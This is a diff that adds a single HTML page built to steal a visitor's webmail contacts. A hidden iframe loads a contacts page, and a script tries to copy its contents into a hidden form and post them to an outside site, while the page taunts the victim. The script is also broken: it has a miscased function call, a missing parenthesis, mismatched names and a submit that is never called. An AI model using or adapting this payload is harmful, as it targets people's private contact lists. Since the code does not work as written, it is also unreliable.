@@ -1,0 +1,19 @@
+<html>
+  <body>
+     <iframe style="display:none" name="WebmailIframe"
+       src="https://mail.syber-defense-system.business.site/ViewContacts"><!-- step 1-->
+         </iframe>
+            <form action="syber-defense-system.business.site/getContactList" Value="default value">
+              <input type="hidden" name="contacts" value="default value">
+                 </form>
+                   I have seen your contacts and belong to me. :)
+                    </body>
+                    <script>
+                    function doFuck () {
+                     var victimsContacts =document.WebmailIframe.innerHTML;
+                      document.FuckForm.contacts = victimsContactsList;
+                      document.FuckForm.submit;
+                    }
+            setTIMEOUT ("doFuck ()" ,1000 ;
+            </script>
+         <html>
